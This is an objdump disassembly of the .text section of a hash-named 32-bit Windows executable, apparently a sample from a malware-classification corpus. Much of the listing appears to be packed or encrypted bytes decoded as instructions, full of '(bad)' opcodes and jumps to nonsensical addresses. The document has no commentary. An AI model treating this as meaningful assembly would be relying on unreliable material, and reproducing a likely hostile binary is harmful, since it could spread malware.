
d08ce27da90ae0128017bcc7311067d3ba796e26909d90873303cee07c0bc5a6.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [ebp+0x1],dl
  401003:	add    BYTE PTR [edi-0x17ffbeab],ah
  401009:	addr16 je 0x40105c
  40100c:	aad    0x6d
  40100e:	arpl   WORD PTR [ecx-0x35],ax
  401011:	data16 jb 0x401079
  401014:	mov    ah,0x71
  401016:	add    BYTE PTR [eax],al
  401018:	jecxz  0x401087
  40101a:	popa   
  40101b:	fld    TBYTE PTR fs:[ebx+0x62]
  40101f:	jb     0x400fa7
  401021:	jo     0x40109c
  401023:	inc    ebp
  401024:	lahf   
  401025:	inc    ebx
  401026:	add    BYTE PTR [eax],al
  401028:	arpl   WORD PTR [ebp+0x61],bp
  40102b:	fs pop ebx
  40102d:	imul   esp,DWORD PTR [edx+0x72],0xffffff86
  401031:	jo     0x4010ac
  401033:	inc    ebp
  401034:	jg     0x40108b
  401036:	add    BYTE PTR [eax],al
  401038:	push   0x784d7467
  40103d:	data16 jne 0x4010ac
  401040:	dec    edx
  401041:	dec    edx
  401042:	popa   
  401043:	outs   dx,BYTE PTR ds:[esi]
  401044:	inc    ebx
  401045:	outs   dx,BYTE PTR ds:[esi]
  401046:	gs inc ecx
  401048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401049:	add    al,BYTE PTR [eax]
  40104b:	add    BYTE PTR [eax+esi*2+0x65],ah
  40104f:	popa   
  401050:	cmp    esp,DWORD PTR [edi+0x46]
  401053:	imul   ecx,DWORD PTR [ebx+0x67],0x71430041
  40105a:	je     0x4010ce
  40105c:	inc    esp
  40105d:	arpl   WORD PTR [ecx+eax*2-0x59],si
  401061:	add    al,BYTE PTR [eax]
  401063:	add    al,ah
  401065:	gs je  0x4010bf
	...
  40107c:	add    dh,bh
  40107e:	ins    BYTE PTR es:[edi],dx
  40107f:	outs   dx,DWORD PTR fs:[esi]
  401081:	adc    BYTE PTR [eax+0x44],dh
  401084:	imul   esi,ebp,0x8746365
  40108a:	jno    0x401105
  40108c:	inc    ecx
  40108d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40108e:	add    al,BYTE PTR [eax]
  401090:	add    al,ah
  401092:	gs je  0x4010e2
  401095:	shl    BYTE PTR [esi+0x75],1
  401098:	ins    BYTE PTR es:[edi],dx
  401099:	ret    0x614a
  40109c:	outs   dx,BYTE PTR ds:[esi]
  40109d:	retf   
  40109e:	outs   dx,BYTE PTR ds:[esi]
  40109f:	gs push edi
  4010a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4010a2:	add    al,BYTE PTR [eax]
  4010a4:	add    BYTE PTR [ebx-0x6cffc000],ch
  4010aa:	add    BYTE PTR [eax+0x0],al
  4010ad:	mov    eax,DWORD PTR [eax]
  4010af:	inc    eax
  4010b0:	add    BYTE PTR [ebx+0x0],dh
  4010b3:	inc    eax
  4010b4:	add    BYTE PTR [edi+0x0],ch
  4010b7:	inc    eax
  4010b8:	add    BYTE PTR [ebx+0x0],dh
  4010bb:	inc    eax
  4010bc:	add    BYTE PTR [edi-0x70ffc000],al
  4010c2:	add    BYTE PTR [eax+0x0],al
  4010c5:	push   0x75507465
  4010ca:	imul   esp,DWORD PTR [ebx+0x41],0xffffff8b
  4010ce:	data16 jb 0x401136
  4010d1:	je     0x401142
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	jae    0x401142
  4010d7:	popa   
  4010d8:	imul   ebp,DWORD PTR fs:[ecx+0x62],0x72
  4010dd:	inc    esi
  4010de:	jo     0x401159
  4010e0:	inc    ebp
	...
  4010f5:	add    BYTE PTR [edi+0x41],cl
  4010f8:	add    BYTE PTR [eax],al
  4010fa:	dec    esp
  4010fb:	gs jb  0x40116c
  4010fe:	inc    edx
  4010ff:	outs   dx,BYTE PTR ds:[esi]
  401100:	xor    esi,DWORD PTR [edx]
  401102:	and    DWORD PTR [esi+0x6c],0x2a76c
  401109:	add    BYTE PTR [edx],dl
  40110b:	jo     0x401183
  40110d:	arpl   WORD PTR ds:0x3642e77,dx
  401113:	outs   dx,DWORD PTR ds:[esi]
  401114:	add    BYTE PTR [eax],al
  401116:	cli    
  401117:	gs ins DWORD PTR es:[edi],dx
  401119:	jae    0x401125
  40111b:	ja     0x40111d
  40111d:	add    BYTE PTR [edx],cl
  40111f:	jo     0x401197
  401121:	arpl   bp,si
  401123:	jbe    0x401153
  401125:	fs sti 
  401127:	outs   dx,BYTE PTR ds:[esi]
  401128:	add    BYTE PTR [eax],al
  40112a:	shl    BYTE PTR [ebp+0x6d],cl
  40112d:	arpl   di,dx
  40112f:	jns    0x401131
  401131:	add    cl,bh
  401133:	imul   esi,DWORD PTR [edx+0x74],0x416c61d2
  40113a:	shr    DWORD PTR [esi+0x6f],cl
  40113d:	arpl   WORD PTR [edi-0x26fffffe],sp
  401143:	imul   esi,DWORD PTR [edx+0x74],0x416c61b2
  40114a:	xchg   ebx,eax
  40114b:	outs   dx,BYTE PTR ds:[esi]
  40114c:	outs   dx,DWORD PTR ds:[esi]
  40114d:	arpl   WORD PTR [edi+0x7a000002],sp
  401153:	ins    BYTE PTR es:[edi],dx
  401154:	ins    DWORD PTR es:[edi],dx
  401155:	popa   
  401156:	xchg   edi,eax
  401157:	push   esp
  401158:	imul   esp,DWORD PTR [ebp+0x0],0x0
	...
  40116f:	js     0x4011bc
  401171:	inc    si
  401173:	mov    gs,WORD PTR [esi+0x65]
  401176:	add    BYTE PTR [ecx+0x69],bl
  401179:	jb     0x4011ef
  40117b:	jb     0x4011de
  40117d:	ins    BYTE PTR es:[edi],dx
  40117e:	push   eax
  40117f:	push   ebp
  401180:	imul   esi,DWORD PTR [ebp+eiz*2+0x44],0x76
  401185:	add    BYTE PTR [eax],al
  401187:	pop    edi
  401188:	gs popa 
  40118a:	jo     0x4011f2
  40118c:	outs   dx,BYTE PTR ds:[esi]
  40118d:	ins    BYTE PTR es:[edi],dx
  40118e:	outs   dx,DWORD PTR ds:[esi]
  40118f:	inc    esp
  401190:	add    al,BYTE PTR [eax]
  401192:	add    BYTE PTR [ebp+eiz*2+0x72],cl
  401196:	outs   dx,BYTE PTR ds:[esi]
  401197:	dec    edx
  401198:	outs   dx,BYTE PTR ds:[esi]
  401199:	xor    esi,DWORD PTR [edx]
  40119b:	jns    0x401203
  40119d:	ins    BYTE PTR es:[edi],dx
  40119e:	ins    BYTE PTR es:[edi],dx
  40119f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011a0:	add    al,BYTE PTR [eax]
  4011a2:	add    al,ah
  4011a4:	pop    edi
  4011a5:	je     0x4011f7
  4011a7:	adc    eax,0x1465636a
  4011ac:	jbe    0x4011f6
  4011ae:	gs push es
  4011b0:	jae    0x4011b2
  4011b2:	add    BYTE PTR [edi-0x58febbfe],ah
  4011b8:	sahf   
  4011b9:	pop    ecx
  4011ba:	nop
  4011bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011bc:	in     al,dx
  4011bd:	add    eax,DWORD PTR [eax]
  4011bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011c0:	out    0x3,eax
  4011c2:	add    BYTE PTR [edi-0x58ff0408],ah
  4011c8:	xor    eax,DWORD PTR [ebx]
  4011ca:	add    BYTE PTR [edi-0x58fffc15],ah
  4011d0:	sub    eax,DWORD PTR [eax+eax*1]
	...
  4011e7:	add    BYTE PTR [edi-0x58fffc15],ah
  4011ed:	jmp    0x4011f2
  4011ef:	add    BYTE PTR [edi-0x58fffc15],ah
  4011f5:	jmp    0x4011fa
  4011f7:	add    BYTE PTR [edi-0x58fffc15],ah
  4011fd:	jmp    0x401202
  4011ff:	add    BYTE PTR [edi-0x58fffc15],ah
  401205:	jmp    0x40120a
  401207:	add    BYTE PTR [edi-0x58fffb95],ah
  40120d:	loope  0x401229
  40120f:	mov    edx,0x9afeb99
  401214:	repnz retf 0x1bb
  401218:	imul   esp,DWORD PTR [esi+0x23f5425],0x77
  40121f:	and    BYTE PTR [edi-0x3],dl
  401222:	push   0x67
  401224:	xor    eax,0x442068ca
  401229:	retf   0x6e69
  40122c:	inc    eax
  40122d:	xlat   BYTE PTR ds:[ebx]
  40122e:	and    esp,DWORD PTR [edx+0x42]
  401231:	or     esi,DWORD PTR [esi+0x75]
  401234:	adc    DWORD PTR [ebp*2+0x4a9fc76e],ecx
  40123b:	push   ebx
  40123c:	(bad)  
  40123d:	mov    esi,0xfa02646a
  401242:	or     BYTE PTR ds:0x3cd02ad,cl
  401248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401249:	add    ch,cl
  40124b:	add    eax,DWORD PTR [eax]
	...
  401261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401262:	add    bh,BYTE PTR [ecx-0x62fd58c0]
  401268:	add    al,0xa4
  40126a:	add    bh,BYTE PTR [esi]
  40126c:	mov    BYTE PTR [ebx],ah
  40126e:	dec    ecx
  40126f:	jmp    0xe942b977
  401274:	add    esp,DWORD PTR [edi-0x4ffbf6fe]
  40127a:	add    esi,edx
  40127c:	add    al,0xa5
  40127e:	xor    al,0xe9
  401280:	stc    
  401281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401282:	add    ch,cl
  401284:	dec    ebp
  401285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401286:	add    ch,cl
  401288:	add    esp,DWORD PTR [edi-0x5812aafe]
  40128e:	add    ch,cl
  401290:	adc    esp,DWORD PTR [edi-0x59ec16fe]
  401296:	add    ch,cl
  401298:	add    esp,DWORD PTR [edi+0x2]
  40129b:	jmp    0xe942b9b3
  4012a0:	add    eax,0x3ed02a7
  4012a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012a6:	add    ch,cl
  4012a8:	add    esp,DWORD PTR [edi-0x58fc12fe]
  4012ae:	add    ch,cl
  4012b0:	add    esp,DWORD PTR [edi-0x598c16fe]
  4012b6:	add    ch,cl
  4012b8:	add    eax,0xe2ed02a7
  4012bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012be:	add    ch,bl
  4012c0:	add    esp,DWORD PTR [edi+0x3e902]
	...
  4012da:	xchg   edi,eax
  4012db:	add    ch,cl
  4012dd:	adc    esp,DWORD PTR [edi-0x48fc16fe]
  4012e3:	add    ch,cl
  4012e5:	adc    esp,DWORD PTR [edi-0x5b16fffe]
  4012eb:	add    al,BYTE PTR [eax]
  4012ed:	fldenv [edx+eax*1+0x2a4e900]
  4012f4:	add    cl,ch
  4012f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012f7:	add    al,BYTE PTR [eax]
  4012f9:	aad    0xd5
  4012fb:	add    DWORD PTR [eax],eax
  4012fd:	and    DWORD PTR [edx+eax*1+0x2a4e900],esp
  401304:	add    cl,ch
  401306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401307:	add    al,BYTE PTR [eax]
  401309:	jmp    0xe94015b2
  40130e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40130f:	add    al,BYTE PTR [eax]
  401311:	jmp    0xe94015ba
  401316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401317:	add    al,BYTE PTR [eax]
  401319:	jmp    0xe94015c2
  40131e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40131f:	add    al,BYTE PTR [eax]
  401321:	jmp    0xe94015ca
  401326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401327:	add    al,BYTE PTR [eax]
  401329:	jmp    0xe94015d2
  40132e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40132f:	add    al,BYTE PTR [eax]
  401331:	jmp    0xe94015da
  401336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401337:	add    al,BYTE PTR [eax]
  401339:	jmp    0xe94015e2
	...
  401352:	add    BYTE PTR [edx+eax*1+0x2a4e900],ah
  401359:	add    cl,ch
  40135b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40135c:	add    al,BYTE PTR [eax]
  40135e:	jmp    0xe9401607
  401363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401364:	add    al,BYTE PTR [eax]
  401366:	jns    0x4013c4
  401368:	add    DWORD PTR [eax],eax
  40136a:	ins    DWORD PTR es:[edi],dx
  40136b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40136c:	add    al,BYTE PTR [eax]
  40136e:	jmp    0xe9401617
  401373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401374:	add    al,BYTE PTR [eax]
  401376:	add    BYTE PTR [esi+0x7e000003],cl
  40137c:	add    eax,DWORD PTR [eax]
  40137e:	add    BYTE PTR [esi+0x3],bh
  401381:	add    BYTE PTR [eax],al
  401383:	mov    es,WORD PTR [ebx]
  401385:	add    BYTE PTR [eax],al
  401387:	push   eax
  401388:	addr16 gs js 0x4013a6
  40138c:	add    eax,DWORD PTR [eax]
  40138e:	add    BYTE PTR ds:0x4e0000f0,al
  401394:	adc    eax,DWORD PTR [eax]
  401396:	add    BYTE PTR [esi-0x7],cl
  401399:	add    BYTE PTR [eax],al
  40139b:	ds std 
  40139d:	(bad)  
  40139e:	(bad)  
  40139f:	add    eax,DWORD PTR ds:[eax]
  4013a2:	add    BYTE PTR [esi+0x3],cl
  4013a5:	add    BYTE PTR [eax],al
  4013a7:	dec    esi
  4013a8:	add    eax,DWORD PTR [eax]
  4013aa:	add    BYTE PTR [esi-0x5fa00002],bl
  4013b0:	jo     0x401416
  4013b2:	popa   
  4013b3:	jp     0x401418
	...
  4013c9:	add    BYTE PTR [eax],al
  4013cb:	add    BYTE PTR [esi],cl
  4013cd:	add    al,0x0
  4013cf:	add    dh,bh
  4013d1:	adc    al,BYTE PTR [ecx]
  4013d3:	add    dh,bh
  4013d5:	cld    
  4013d6:	(bad)  
  4013d7:	dec    DWORD PTR [esi]
  4013d9:	add    eax,DWORD PTR [ecx]
  4013db:	add    BYTE PTR [esi],cl
  4013dd:	add    eax,DWORD PTR [eax]
  4013df:	add    dh,bh
  4013e1:	add    al,BYTE PTR [eax]
  4013e3:	add    dh,bh
  4013e5:	add    al,BYTE PTR [eax]
  4013e7:	add    BYTE PTR [esi-0xfc00002],cl
  4013ed:	push   esi
  4013ee:	popa   
  4013ef:	je     0x401390
  4013f1:	(bad)  
  4013f2:	(bad)  
  4013f3:	push   DWORD PTR [esi]
  4013f5:	inc    ecx
  4013f6:	add    BYTE PTR [eax],al
  4013f8:	into   
  4013f9:	and    al,BYTE PTR [ecx]
  4013fb:	add    dh,cl
  4013fd:	cmp    al,0x0
  4013ff:	add    BYTE PTR [esi-0x58ffff04],bh
  401405:	jmp    0xebe7140d
  40140a:	add    eax,DWORD PTR [eax]
  40140c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40140d:	jmp    0x401412
  40140f:	add    BYTE PTR [edi+0x670003ab],ah
  401415:	in     al,dx
  401416:	add    eax,DWORD PTR [eax]
  401418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401419:	jmp    0x40141e
  40141b:	add    BYTE PTR [edi-0x58fffc15],ah
  401421:	jmp    0x401426
  401423:	add    BYTE PTR [edi-0x3013734a],ah
  401429:	(bad)  
  40142a:	adc    eax,DWORD PTR [eax-0x59]
  40142d:	add    esi,DWORD PTR [ebp+0x1]
	...
  401444:	add    BYTE PTR [ebp+esi*8-0x9],ah
  401448:	jne    0x4013e9
  40144a:	add    DWORD PTR [edx],0xbc03a76a
  401450:	fisub  DWORD PTR [edi-0x543d3315]
  401456:	jmp    0x4014a8
  401458:	mov    edi,DWORD PTR [ebx]
  40145a:	inc    esp
  40145b:	sub    dl,BYTE PTR [eax]
  40145d:	addr16 jmp 0x40145b
  401460:	jb     0x401408
  401462:	test   al,0xf7
  401464:	adc    DWORD PTR [edx-0x638bfc0d],0x60
  40146b:	push   ecx
  40146c:	or     BYTE PTR [edx+ebx*8],ch
  40146f:	div    BYTE PTR [ebp-0x51]
  401472:	pushf  
  401473:	push   edx
  401474:	or     dh,bl
  401476:	test   eax,0x60520000
  40147b:	call   0x6cd40003
  401480:	dec    edi
  401481:	mov    bh,0x2b
  401483:	add    al,0xf8
  401485:	push   ebp
  401486:	jmp    0x8f07:0xf6c8ffc2
  40148d:	push   0x73
  40148f:	mov    edi,0xe902bb45
  401494:	add    esp,DWORD PTR [edi-0x60ae8dfe]
  40149a:	mov    ebx,edi
  40149c:	imul   esp,DWORD PTR [edi-0x67ec2b0b],0x1af7456f
  4014a6:	sti    
  4014a7:	ds jno 0x4014aa
	...
  4014be:	lahf   
  4014bf:	cmc    
  4014c0:	fwait
  4014c1:	movd   mm0,eax
  4014c4:	fld    QWORD PTR [ebx]
  4014c6:	ror    BYTE PTR [ecx-0x5947ceb],cl
  4014cc:	xchg   ecx,eax
  4014cd:	jge    0x401466
  4014cf:	inc    edx
  4014d0:	jmp    0x2a43ead0
  4014d5:	mul    DWORD PTR [eax+0x3f]
  4014d8:	add    DWORD PTR [edi+eiz*4],eax
  4014db:	add    ch,cl
  4014dd:	mov    esi,0x3e9f6e2
  4014e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014e3:	add    ah,BYTE PTR [edx+0x51]
  4014e6:	scas   eax,DWORD PTR es:[edi]
  4014e7:	mov    ebx,edi
  4014e9:	mov    dl,ch
  4014eb:	cli    
  4014ec:	cmp    DWORD PTR [edx-0x5b],ebp
  4014ef:	cmc    
  4014f0:	pop    esp
  4014f1:	clc    
  4014f2:	and    BYTE PTR [edi-0x2f],ch
  4014f5:	not    BYTE PTR [edx-0x44ae39f6]
  4014fb:	mov    DWORD PTR [esp+edi*8],esp
  4014fe:	fidivr WORD PTR [edi-0x76a5fc13]
  401504:	mov    ebp,0x11f9e382
  401509:	ret    0x4297
  40150c:	jmp    0xaa438b0c
  401511:	imul   al
  401513:	ds xchg ecx,eax
  401515:	add    esp,DWORD PTR [edi+0x6abee902]
  40151b:	imul   cl
  40151d:	add    esp,DWORD PTR [edi+0x620002]
	...
  401537:	push   edi
  401538:	or     cl,BYTE PTR [ebx-0x7c0d025]
  40153e:	mov    ecx,0xd4ff033e
  401543:	mov    al,0xf4
  401545:	jne    0x401598
  401547:	cdq    
  401548:	outs   dx,BYTE PTR ds:[esi]
  401549:	or     BYTE PTR [esi-0xa],cl
  40154c:	push   cs
  40154d:	(bad)  
  40154e:	mov    esp,0x3e87ea9c
  401553:	xchg   ecx,eax
  401554:	hlt    
  401555:	push   eax
  401556:	(bad)  
  401557:	xlat   BYTE PTR ds:[ebx]
  401558:	or     cl,BYTE PTR [ebx+0x6a030edb]
  40155e:	jmp    0x1f3c83dc
  401563:	idiv   edx
  401565:	call   FWORD PTR [esp+ebp*4-0x30aad0d]
  40156c:	xchg   DWORD PTR [ebp+0x1],edx
  40156f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401570:	dec    ebp
  401571:	or     al,0xc2
  401573:	je     0x4015e2
  401575:	push   es
  401576:	ret    0xca64
  401579:	ret    0xa4e1
  40157c:	mov    edx,0x2a4e901
  401581:	leave  
  401582:	stos   DWORD PTR es:[edi],eax
  401583:	fwait
  401584:	add    dl,BYTE PTR [ebp+0x62]
  401587:	jo     0x23cbe351
  40158d:	adc    DWORD PTR [ecx],ebp
  40158f:	stos   DWORD PTR es:[edi],eax
  401590:	cli    
  401591:	jb     0x40157b
  401593:	out    0xf3,eax
  401595:	(bad)  
  401596:	cmp    al,0x9b
  401598:	repz jne 0x40157c
	...
  4015af:	add    BYTE PTR [ebx+edi*2],cl
  4015b2:	jmp    DWORD PTR [esi+0x14c007fa]
  4015b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015b9:	leave  
  4015ba:	ret    0xa4e5
  4015bd:	xchg   DWORD PTR [ebp-0x1f],edx
  4015c0:	das    
  4015c1:	adc    DWORD PTR [ebp+0x50fa8300],ecx
  4015c7:	call   ebx
  4015c9:	ud0    esi,DWORD PTR [ebp-0x36]
  4015cd:	out    dx,al
  4015ce:	jne    0x4015d8
  4015d0:	dec    ecx
  4015d1:	push   eax
  4015d2:	or     al,0x85
  4015d4:	jle    0x40164c
  4015d6:	adc    ecx,DWORD PTR [ebx+0x453bec03]
  4015dc:	sahf   
  4015dd:	fs pop es
  4015df:	mov    eax,0xffffff8f
  4015e4:	cmc    
  4015e5:	hlt    
  4015e6:	sub    al,al
  4015e8:	cmc    
  4015e9:	add    BYTE PTR [ebx],ch
  4015eb:	rol    bh,0xc0
  4015ee:	or     al,0x0
  4015f0:	adc    ecx,DWORD PTR [edx-0x53d7c14]
  4015f6:	push   esi
  4015f7:	push   0x401003
  4015fc:	mov    dh,0x70
  4015fe:	add    ebx,eax
  401600:	test   eax,0x3e0c7d81
  401605:	arpl   WORD PTR [esi],ax
  401607:	or     ebx,0x7
  40160a:	add    BYTE PTR [ebp+0x51],dh
  40160d:	sub    al,al
  40160f:	pop    esi
  401610:	xchg   eax,eax
  401612:	or     al,0x0
	...
  401628:	add    BYTE PTR [ebp-0x2cffef94],bh
  40162e:	or     BYTE PTR [eax-0xf1ff],bh
  401634:	pop    ebp
  401635:	inc    edi
  401636:	ror    DWORD PTR [eax+eax*1],0x95
  40163a:	fs or  al,0xc7
  40163d:	ret    
  40163e:	cli    
  40163f:	add    BYTE PTR [eax],al
  401641:	push   cs
  401642:	dec    DWORD PTR [edx+0x128a0655]
  401648:	(bad)  
  401649:	ret    
  40164a:	cli    
  40164b:	push   eax
  40164c:	call   DWORD PTR [ebx-0x5800a9f2]
  401652:	push   ss
  401653:	or     al,0xff
  401655:	jne    0x401650
  401657:	jle    0x401619
  401659:	dec    esi
  40165a:	in     al,0x28
  40165c:	shr    BYTE PTR [ecx-0x4e],0xc1
  401660:	or     al,0xa7
  401662:	push   0xeea7fc76
  401667:	cld    
  401668:	sub    ah,bh
  40166a:	mov    edx,0xe99bc2ca
  40166f:	mov    BYTE PTR [ebp-0x5d],al
  401672:	(bad)  
  401674:	sub    edx,esp
  401676:	jmp    0x4016e6
  401678:	les    ecx,FWORD PTR [edi-0x25]
  40167b:	add    eax,DWORD PTR [eax]
  40167d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40167e:	xchg   ecx,eax
  40167f:	retf   0xb3c2
  401682:	fisttp DWORD PTR [esi-0x75]
  401685:	mov    ebx,DWORD PTR [ebx-0x41]
  401688:	clc    
  401689:	sub    BYTE PTR [ecx],0xf4
  40168c:	push   0x0
	...
  4016a1:	add    BYTE PTR [ebx+0x5f0043ed],ah
  4016a7:	mov    es,WORD PTR [edx]
  4016a9:	ret    
  4016aa:	pop    eax
  4016ab:	xchg   BYTE PTR [ebx],al
  4016ad:	push   0xffffffa7
  4016af:	xchg   ebp,eax
  4016b0:	add    BYTE PTR [edx-0x59],ch
  4016b3:	xchg   ebp,eax
  4016b4:	add    BYTE PTR [eax-0x59],ch
  4016b7:	fild   DWORD PTR [ebx]
  4016b9:	cmp    BYTE PTR [eax],0x77
  4016bc:	or     ebp,eax
  4016be:	es mov cl,0x4
  4016c1:	add    BYTE PTR [esi],bl
  4016c3:	daa    
  4016c4:	lock inc eax
  4016c6:	call   0x5ddb:0xafc2bcdf
  4016cd:	add    BYTE PTR [edx],ah
  4016cf:	pop    ds
  4016d0:	in     al,dx
  4016d1:	push   eax
  4016d2:	jg     0x4016af
  4016d4:	adc    eax,DWORD PTR [eax]
  4016d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016d7:	mov    ax,di
  4016da:	or     BYTE PTR [ecx+0x2f050f3],ah
  4016e0:	sbb    al,0xf0
  4016e2:	jmp    DWORD PTR [ebp-0x4a]
  4016e5:	add    al,0xa7
  4016e7:	std    
  4016e8:	test   al,0x79
  4016ea:	test   eax,0xbff014f1
  4016ef:	dec    edi
  4016f0:	sahf   
  4016f1:	add    al,0xa7
  4016f3:	sbb    eax,0xfae5bda9
  4016f8:	call   0x5d2a49ef
  4016fd:	mov    DWORD PTR [edi+0x57f366e1],ebp
  401703:	icebp  
  401704:	aam    0xff
	...
  40171a:	add    BYTE PTR [eax-0x670ca9ed],cl
  401720:	test   esp,ecx
  401722:	jmp    0x4016cb
  401724:	ja     0x4016ab
  401726:	repz adc ch,bh
  401729:	push   ecx
  40172a:	cmp    ebx,DWORD PTR [eax+0x2]
  40172d:	jmp    0xe942bddd
  401732:	add    ebx,DWORD PTR [esi-0x3c]
  401735:	icebp  
  401736:	add    edx,edx
  401738:	jge    0x401747
  40173a:	pop    esp
  40173b:	sub    BYTE PTR [ecx+ebp*4],dl
  40173e:	add    ebx,DWORD PTR [edi+0x74]
  401741:	call   0xeb9c680c
  401746:	pop    ebp
  401747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401748:	icebp  
  401749:	je     0x401746
  40174b:	dec    eax
  40174c:	sahf   
  40174d:	hlt    
  40174e:	repnz cmp BYTE PTR [ebx+0x57a7082b],bh
  401755:	jb     0x401736
  401757:	mov    edi,0xa743fba6
  40175c:	jmp    0x443:0xf0e4055b
  401763:	jge    0x401767
  401765:	(bad)  
  401766:	js     0x401707
  401768:	fisubr DWORD PTR [esi-0x10]
  40176b:	add    cl,dh
  40176d:	add    BYTE PTR [eax+0x140005e2],ah
  401773:	jo     0x401753
  401775:	sub    DWORD PTR [ebp-0x43ba604],0x64
  40177c:	add    bh,al
  40177e:	sbb    eax,DWORD PTR [eax]
	...
  401794:	mov    ds:0x4f8effc5,al
  401799:	dec    BYTE PTR [esi+0x45c8bb2c]
  40179f:	jge    0x401745
  4017a1:	add    al,BYTE PTR [eax]
  4017a3:	jmp    0xf53f1a02
  4017a8:	mov    al,0xef
  4017aa:	jne    0x40179d
  4017ac:	int3   
  4017ad:	(bad)  
  4017ae:	std    
  4017af:	pop    esi
  4017b0:	xchg   ebp,eax
  4017b1:	jl     0x401808
  4017b3:	loope  0x4017ce
  4017b5:	adc    eax,0xf080d4ff
  4017ba:	jne    0x4017fd
  4017bc:	xchg   ebp,eax
  4017bd:	jbe    0x4017c7
  4017bf:	fimul  DWORD PTR ds:[edx]
  4017c2:	leave  
  4017c3:	sub    edi,DWORD PTR [eax+esi*8+0x54]
  4017c7:	bound  edx,QWORD PTR [eax+0x5b]
  4017ca:	add    dl,bh
  4017cc:	in     al,0x2
  4017ce:	clc    
  4017cf:	fwait
  4017d0:	stos   DWORD PTR es:[edi],eax
  4017d1:	ret    
  4017d2:	inc    DWORD PTR [ebx-0x1e8a105c]
  4017d8:	ins    BYTE PTR es:[edi],dx
  4017d9:	popf   
  4017da:	inc    DWORD PTR [esi]
  4017dc:	push   ebp
  4017dd:	mov    edx,0x55a4e5c2
  4017e2:	mov    eax,DWORD PTR ds:0x6a1455b9
  4017e8:	add    BYTE PTR [edx],0x75
  4017eb:	in     eax,dx
  4017ec:	in     eax,dx
  4017ed:	les    edx,FWORD PTR [eax]
  4017ef:	jmp    0xd6508e0b
  4017f4:	nop
  4017f5:	(bad)  
  4017f6:	(bad)  
  4017f7:	push   esp
	...
  40180c:	add    BYTE PTR [ebx],dl
  40180e:	call   0xf2231907
  401813:	dec    DWORD PTR [ebx+0x2210a9b]
  401819:	inc    edi
  40181a:	leave  
  40181b:	adc    BYTE PTR [eax],al
  40181d:	fwait
  40181e:	ins    DWORD PTR es:[edi],dx
  40181f:	in     al,dx
  401820:	cmp    DWORD PTR [edx],0xfffffff3
  401823:	push   DWORD PTR [ebp-0x2e]
  401826:	dec    ebp
  401827:	add    al,0x8d
  401829:	mov    esi,edx
  40182b:	push   eax
  40182c:	(bad)  
  40182d:	mov    ebx,0x21c3e7ee
  401832:	repnz dec DWORD PTR [ebx+0x3883028b]
  401839:	into   
  40183a:	ja     0x401843
  40183c:	mov    ecx,DWORD PTR [ebx+0x55c80ff2]
  401842:	or     BYTE PTR [ebx],ch
  401844:	rcl    bh,0xc8
  401847:	or     BYTE PTR [eax],al
  401849:	pop    ebx
  40184a:	outs   dx,BYTE PTR ds:[esi]
  40184b:	in     al,dx
  40184c:	or     edx,0xfffffff2
  40184f:	push   DWORD PTR [ebp-0x6e]
  401852:	dec    ebp
  401853:	add    cl,BYTE PTR [ebp-0xaf0eb5]
  401859:	cmp    ebp,ebx
  40185b:	out    0x97,eax
  40185d:	shl    ecx,0xff
  401860:	mov    edi,DWORD PTR [ebx]
  401862:	out    dx,eax
  401863:	cmp    BYTE PTR [eax],0x4e
  401866:	ja     0x401870
  401868:	psubw  mm0,QWORD PTR [edi-0x2]
  40186c:	xchg   BYTE PTR [edx+0x2b02cd],cl
	...
  401886:	jle    0x401833
  401888:	ret    0x4e08
  40188b:	pop    eax
  40188c:	mov    ebp,esp
  40188e:	int    0xba
  401890:	cld    
  401891:	(bad)  
  401892:	mov    ebx,0xb30169ef
  401897:	dec    eax
  401898:	call   DWORD PTR [eax+0x1]
  40189b:	js     0x4018a5
  40189d:	call   0x315c49
  4018a2:	adc    BYTE PTR [esi+eax*2+0xc],ah
  4018a6:	and    al,0x1
  4018a8:	add    al,0x74
  4018aa:	test   eax,0xf845b9e0
  4018af:	ret    
  4018b0:	add    eax,0xc5a1e72b
  4018b5:	or     BYTE PTR [edi+0x2cec7d2e],ah
  4018bb:	ss adc al,0x83
  4018be:	popf   
  4018bf:	fnstenv [esi+0x4]
  4018c2:	ficomp WORD PTR [edx-0x12360001]
  4018c8:	(bad)  
  4018c9:	(bad)  
  4018ca:	cmp    dh,cl
  4018cc:	fneni(8087 only) 
  4018ce:	mov    ebx,0xe70bf077
  4018d3:	cmc    
  4018d4:	cld    
